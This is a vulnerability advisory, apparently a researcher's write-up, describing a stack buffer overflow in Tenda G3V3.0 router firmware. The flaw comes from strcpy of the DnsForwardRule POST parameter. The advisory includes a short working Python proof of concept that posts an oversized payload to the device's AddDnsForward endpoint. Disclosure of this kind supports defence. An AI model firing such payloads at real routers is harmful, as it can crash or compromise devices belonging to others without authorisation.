## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-3369.html

## Affected version

G3V3.0 V15.11.0.20

## Vulnerability details

The Tenda G3V3.0 V15.11.0.20 firmware has a stack overflow vulnerability in the `formAddDnsForward` function. The `rules` variable receives the `DnsForwardRule` parameter from a POST request and is passed to function `dns_forward_rule_store` as `rules`. 

![image-20240801115612918](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240801115612918.png)

In function `dns_forward_rule_store`, the `rules` is directly assigned to `inputList`. However, since the user can control the input of `DnsForwardRule`, the statement `strcpy((char *)&input_list, (const char *)rules);` can cause a buffer overflow. The user-provided `DnsForwardRule` can exceed the capacity of the `input_list` array, triggering this security vulnerability.

![image-20240801120139970](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240801120139970.png)

![image-20240801115928444](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240801115928444.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/AddDnsForward"
payload = b"a"*2000

data = {
        'DnsForwardRule':payload,
    }
response = requests.post(url, data=data)
print(response.text)
```
